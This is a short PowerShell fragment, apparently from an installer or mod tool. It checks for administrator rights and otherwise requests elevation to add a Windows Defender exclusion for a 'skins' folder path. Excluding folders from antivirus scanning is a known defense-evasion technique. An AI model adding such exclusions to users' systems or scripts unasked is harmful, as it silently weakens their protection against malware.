$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
	$startInfo = New-Object System.Diagnostics.ProcessStartInfo
	$startInfo.FileName = 'powershell.exe'
	$startInfo.Arguments = "-Command `"Add-MpPreference -ExclusionPath '$skinsPath'`""
	$startInfo.Verb = "runas"
[System.Diagnostics.Process]::Start($startInfo) | Out-Null
} else {
}